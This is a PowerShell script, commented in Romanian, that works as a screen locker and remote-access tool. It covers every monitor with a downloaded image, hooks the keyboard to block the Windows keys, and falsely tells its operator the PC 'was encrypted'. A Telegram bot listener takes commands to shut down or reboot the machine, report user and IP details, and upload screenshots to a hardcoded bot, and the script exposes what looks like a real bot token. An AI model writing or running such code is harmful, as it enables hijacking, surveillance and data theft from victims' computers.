# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Configurare Telegram
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatId = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# Descarcă imaginea
function Download-Image {
    Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
}

# Trimite mesaj Telegram
function Send-Telegram($msg) {
    $uri = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{chat_id = $chatId; text = $msg} | ConvertTo-Json
    try { Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' } catch {}
}

# Ascultă comenzi Telegram
function Start-Telegram-Listener {
    $uriGet = "https://api.telegram.org/bot$botToken/getUpdates"
    $lastUpdateId = 0

    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "$uriGet?offset=$($lastUpdateId + 1)&timeout=10"
            foreach ($u in $updates.result) {
                $lastUpdateId = $u.update_id
                $text = $u.message.text

                if ($text -match "/unlock ($user|$pc)|❤️ ($user|$pc)") {
                    Send-Telegram "🔓 PC-ul $user ($pc) a fost deblocat."
                    [Environment]::Exit(0)
                }
                elseif ($text -match "/shutdown ($user|$pc)") {
                    Send-Telegram "🛑 PC-ul $user ($pc) se închide acum."
                    Stop-Computer -Force
                }
                elseif ($text -match "/reboot ($user|$pc)") {
                    Send-Telegram "🔄 PC-ul $user ($pc) dă restart."
                    Restart-Computer -Force
                }
                elseif ($text -match "/info ($user|$pc)") {
                    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
                        Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' })[0].IPAddress
                    $ipPublic = (Invoke-RestMethod "https://api.ipify.org")
                    Send-Telegram "💻 PC: $pc`n👤 User: $user`n🌐 IP local: $ipLocal`n🌍 IP public: $ipPublic"
                }
                elseif ($text -match "/screenshot ($user|$pc)") {
                    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                    $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                    $graphics = [Drawing.Graphics]::FromImage($bmp)
                    $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
                    $screenshotPath = "$env:TEMP\screenshot.jpg"
                    $bmp.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Jpeg)
                    $uriPhoto = "https://api.telegram.org/bot$botToken/sendPhoto"
                    $form = @{chat_id=$chatId; photo=[System.IO.File]::OpenRead($screenshotPath)}
                    Invoke-RestMethod -Uri $uriPhoto -Method Post -Form $form
                }
            }
        } catch {}
        Start-Sleep -Seconds 2
    }
}

# Blocare taste Windows și tasta C
function Block-And-MonitorKeys {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class KeyboardMonitor {
        private static IntPtr hookId = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc proc = HookCallback;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
        public static void BlockAndMonitor() { hookId = SetHook(proc); }
        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == 0x43) Environment.Exit(0);
                if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
"@
    [KeyboardMonitor]::BlockAndMonitor()
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [System.Windows.Forms.Screen]::AllScreens
    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form -Property @{
            WindowState='Maximized'; FormBorderStyle='None'; TopMost=$true
            StartPosition='Manual'; Location=$screen.Bounds.Location; Size=$screen.Bounds.Size; BackColor='Black'
            KeyPreview=$true; Cursor=[System.Windows.Forms.Cursors]::None
        }
        $pictureBox = New-Object Windows.Forms.PictureBox -Property @{Dock='Fill'; Image=[Drawing.Image]::FromFile($tempImagePath); SizeMode='StretchImage'}
        $form.Controls.Add($pictureBox)
        $form.Show()
    }
    Start-Job { Start-Telegram-Listener }
    [System.Windows.Forms.Application]::Run()
}

# Execută aplicația
Download-Image
Send-Telegram "✅ PC-ul $user ($pc) a fost criptat și protejat cu succes!"
Block-And-MonitorKeys
Show-FullScreenImage
